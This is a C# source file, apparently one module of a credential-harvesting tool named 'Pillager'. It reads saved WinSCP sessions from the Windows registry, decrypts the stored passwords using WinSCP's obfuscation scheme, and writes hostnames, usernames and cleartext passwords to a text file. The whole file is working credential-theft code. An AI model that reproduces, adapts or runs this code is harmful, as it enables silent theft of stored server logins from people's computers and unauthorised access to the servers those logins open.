using System.IO;
using System.Text;
using Microsoft.Win32;

namespace Pillager.FTPs
{
    internal class WinSCP
    {
        public static string FTPName = "WinSCP";

        static readonly int PW_MAGIC = 0xA3;
        static readonly char PW_FLAG = (char)0xFF;

        struct Flags
        {
            public char flag;
            public string remainingPass;
        }

        private static Flags DecryptNextCharacterWinSCP(string passwd)
        {
            Flags Flag;
            string bases = "0123456789ABCDEF";

            int firstval = bases.IndexOf(passwd[0]) * 16;
            int secondval = bases.IndexOf(passwd[1]);
            int Added = firstval + secondval;
            Flag.flag = (char)(((~(Added ^ PW_MAGIC) % 256) + 256) % 256);
            Flag.remainingPass = passwd.Substring(2);
            return Flag;
        }

        private static string DecryptWinSCPPassword(string Host, string userName, string passWord)
        {
            var clearpwd = string.Empty;
            char length;
            string unicodeKey = userName + Host;
            Flags Flag = DecryptNextCharacterWinSCP(passWord);

            int storedFlag = Flag.flag;

            if (storedFlag == PW_FLAG)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                length = Flag.flag;
            }
            else
            {
                length = Flag.flag;
            }

            Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
            Flag.remainingPass = Flag.remainingPass.Substring(Flag.flag * 2);

            for (int i = 0; i < length; i++)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                clearpwd += Flag.flag;
            }
            if (storedFlag == PW_FLAG)
            {
                clearpwd = clearpwd.Substring(0, unicodeKey.Length) == unicodeKey ? clearpwd.Substring(unicodeKey.Length) : "";
            }
            return clearpwd;
        }

        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string registry = @"Software\Martin Prikryl\WinSCP 2\Sessions";
            var registryKey = Registry.CurrentUser.OpenSubKey(registry);
            if (registryKey == null) return "";
            foreach (string rname in registryKey.GetSubKeyNames())
            {
                using (var session = registryKey.OpenSubKey(rname))
                {
                    if (session != null)
                    {
                        string hostname = (session.GetValue("HostName") != null) ? session.GetValue("HostName").ToString() : "";
                        if (!string.IsNullOrEmpty(hostname))
                        {
                            try
                            {
                                string username = session.GetValue("UserName").ToString();
                                string password = session.GetValue("Password").ToString();
                                sb.AppendLine("hostname: "+ hostname);
                                sb.AppendLine("username: " + username);
                                sb.AppendLine("rawpass: " + password);
                                sb.AppendLine("password: " + DecryptWinSCPPassword(hostname, username, password));
                            }
                            catch
                            { }
                        }
                    }
                }
            }


            return sb.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output))
                {
                    string savepath = Path.Combine(path, FTPName);
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, FTPName + ".txt"), output);
                }
            }
            catch { }
        }
    }
}
